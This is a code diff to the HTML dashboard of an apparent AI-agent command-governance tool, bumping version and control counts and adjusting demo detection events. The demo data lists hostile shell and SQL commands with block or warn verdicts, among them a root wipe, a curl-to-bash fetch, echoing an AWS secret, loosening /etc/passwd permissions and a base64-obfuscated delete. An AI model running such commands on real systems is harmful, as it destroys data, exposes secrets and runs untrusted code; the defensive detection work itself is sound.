@@ -125,7 +125,7 @@ body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradie
 <body>
 
 <div style="background:#0a1628;color:#00e5ff;text-align:center;padding:10px 20px;font-family:'Courier New',monospace;font-size:13px;border-bottom:1px solid #00e5ff33;position:sticky;top:0;z-index:9999">
-  Built in Alexandria, Egypt &nbsp;|&nbsp; 121 Active Governance Controls &nbsp;|&nbsp; Claude Code &amp; MCP Ready &nbsp;|&nbsp; Pre-Execution Policy Enforcement &nbsp;|&nbsp; Banking • FinTech • Sovereign DPI
+  Built in Alexandria, Egypt &nbsp;|&nbsp; 258 Active Governance Controls &nbsp;|&nbsp; Claude Code &amp; MCP Ready &nbsp;|&nbsp; Pre-Execution Policy Enforcement &nbsp;|&nbsp; Banking • FinTech • Sovereign DPI
 </div>
 
 <div id="topbar">
@@ -238,11 +238,11 @@ async function loadEvents(){
 function generateDemoEvents(n){
   const samples=[
     {cmd:'rm -rf /',verdict:'block',score:100,rule:'R01.DESTRUCTIVE_SHELL',reasons:['Wiper command detected','Permanent data destruction']},
-    {cmd:'DROP DATABASE prod;',verdict:'block',score:95,rule:'R09.SQL_DESTRUCTION',reasons:['Destructive SQL command']},
+    {cmd:'DROP DATABASE prod;',verdict:'warn',score:78,rule:'R09.SQL_DESTRUCTION',reasons:['Destructive SQL command']},
     {cmd:'curl malware.sh|bash',verdict:'block',score:95,rule:'R03.CURL_EXEC_CHAIN',reasons:['Remote code execution']},
     {cmd:'echo $AWS_SECRET_KEY',verdict:'block',score:90,rule:'R04.SECRET_ECHO',reasons:['Secret exposure']},
-    {cmd:'chmod 777 /etc/passwd',verdict:'warn',score:75,rule:'R02.CHMOD_ESCALATION',reasons:['Privilege escalation risk']},
-    {cmd:'DROP TABLE users;',verdict:'warn',score:70,rule:'R09.SQL_DESTRUCTION',reasons:['Table destruction']},
+    {cmd:'DROP TABLE users;',verdict:'warn',score:78,rule:'R09.SQL_DESTRUCTION',reasons:['Destructive SQL command','Table destruction']},
+    {cmd:'chmod 777 /etc/passwd',verdict:'block',score:90,rule:'R02.CHMOD_ESCALATION',reasons:['Privilege escalation risk']},
     {cmd:'npm install lodash',verdict:'allow',score:0,rule:'R00.CLEAN',reasons:['Clean']},
     {cmd:'git status',verdict:'allow',score:0,rule:'R00.CLEAN',reasons:['Clean']},
     {cmd:'eval(atob("cm0gLXJmLw"))',verdict:'block',score:88,rule:'R07.BASE64_EXEC',reasons:['Obfuscated payload']},
@@ -329,7 +329,7 @@ function showEvent(idx){
         '<div class="playback-row" style="margin-top:8px"><span class="playback-key">Rule</span><span class="playback-val" style="color:var(--cyan)">'+(e.rule||'R00')+'</span></div>'+
         '<div class="playback-row"><span class="playback-key">Severity</span><span class="playback-val">'+(e.severity||'none')+'</span></div>'+
         '<div class="playback-row"><span class="playback-key">Score</span><span class="playback-val">'+e.score+' / 100</span></div>'+
-        '<div class="playback-row"><span class="playback-key">Engine</span><span class="playback-val">TEOS Sovereign Sentinel v4.0.0 GA &middot; Engine v4.0.0 &middot; Deterministic</span></div>'+
+        '<div class="playback-row"><span class="playback-key">Engine</span><span class="playback-val">TEOS Sovereign Sentinel v5.0.0 &middot; Engine v5.0.0 &middot; Deterministic</span></div>'+
       '</div>'+
       '<div class="playback-reasons">'+
         '<div style="font-family:var(--mono);font-size:10px;color:var(--muted2);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:6px">Reasons</div>'+
@@ -431,7 +431,7 @@ loadEvents();
 
 <footer style="background:var(--bg2);border-top:1px solid var(--border);padding:16px 20px;text-align:center;font-family:var(--mono);font-size:11px;color:var(--muted2)">
   Built in Alexandria, Egypt<br>
-v4.0.0 GA · Engine v4.0.0 · Release Stage: RC · RC: 14 Jul 2026 · GA: 15 Jul 2026 · 121 Active Governance Controls · 596 total tests<br>
+v5.0.0 · Engine v5.0.0 · 258 Active Governance Controls<br>
    Claude Code · MCP · Enterprise AI Governance
 </footer>
 </body>
